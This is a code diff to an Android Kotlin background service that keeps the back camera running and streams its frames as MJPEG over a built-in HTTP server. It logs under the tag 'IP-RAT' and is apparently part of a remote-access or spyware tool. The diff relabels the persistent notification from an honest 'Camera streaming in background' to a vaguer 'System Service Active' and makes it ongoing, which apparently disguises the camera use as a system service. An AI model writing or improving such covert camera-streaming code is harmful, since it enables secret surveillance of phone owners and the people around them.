@@ -5,6 +5,7 @@ import android.content.Intent
 import android.graphics.Bitmap
 import android.graphics.Matrix
 import android.os.IBinder
+import android.util.Log
 import androidx.camera.core.*
 import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.core.app.NotificationCompat
@@ -33,12 +34,13 @@ class CameraService : LifecycleService() {
         getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
 
         val notification = NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Service Active")
-            .setContentText("Camera streaming in background")
+            .setContentTitle("System Service Active")
+            .setContentText("Background streaming is enabled")
             .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .setOngoing(true)
             .build()
 
-        // Critical: Start as Foreground to keep camera alive
+        // Critical for Android 10+ background camera
         startForeground(1, notification)
         
         startCamera()
@@ -51,17 +53,32 @@ class CameraService : LifecycleService() {
             val cameraProvider = cameraProviderFuture.get()
             val imageAnalyzer = ImageAnalysis.Builder()
                 .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
+                .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                 .build()
                 .also {
                     it.setAnalyzer(cameraExecutor) { image ->
-                        val bitmap = image.toBitmap()
-                        val matrix = Matrix().apply { postRotate(image.imageInfo.rotationDegrees.toFloat()) }
-                        latestBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
-                        image.close()
+                        processImage(image)
                     }
                 }
-            cameraProvider.bindToLifecycle(this, CameraSelector.DEFAULT_BACK_CAMERA, imageAnalyzer)
+            try {
+                cameraProvider.unbindAll()
+                cameraProvider.bindToLifecycle(this, CameraSelector.DEFAULT_BACK_CAMERA, imageAnalyzer)
+            } catch (e: Exception) {
+                Log.e("IP-RAT", "Use case binding failed", e)
+            }
         }, ContextCompat.getMainExecutor(this))
+    }
+
+    private fun processImage(image: ImageProxy) {
+        try {
+            val bitmap = image.toBitmap()
+            val matrix = Matrix().apply { postRotate(image.imageInfo.rotationDegrees.toFloat()) }
+            latestBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
+        } catch (e: Exception) {
+            Log.e("IP-RAT", "Error processing image", e)
+        } finally {
+            image.close()
+        }
     }
 
     private fun startServer() {
@@ -71,22 +88,34 @@ class CameraService : LifecycleService() {
                     call.respondBytesWriter(ContentType.parse("multipart/x-mixed-replace; boundary=--boundary")) {
                         try {
                             while (true) {
-                                latestBitmap?.let { bitmap ->
+                                val bitmap = latestBitmap
+                                if (bitmap != null) {
                                     val stream = ByteArrayOutputStream()
                                     bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
                                     val data = stream.toByteArray()
-                                    writeStringUtf8("--boundary\r\nContent-Type: image/jpeg\r\n\r\n")
+
+                                    writeStringUtf8("--boundary\r\n")
+                                    writeStringUtf8("Content-Type: image/jpeg\r\n")
+                                    writeStringUtf8("Content-Length: ${data.size}\r\n\r\n")
                                     writeFully(data)
                                     writeStringUtf8("\r\n")
                                     flush()
                                 }
                                 delay(100)
                             }
-                        } catch (e: Exception) { }
+                        } catch (e: Exception) {
+                            Log.d("IP-RAT", "Client disconnected")
+                        }
                     }
                 }
             }
         }.start(wait = false)
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        server?.stop(1000, 2000)
+        cameraExecutor.shutdown()
     }
 
     override fun onBind(intent: Intent): IBinder? {
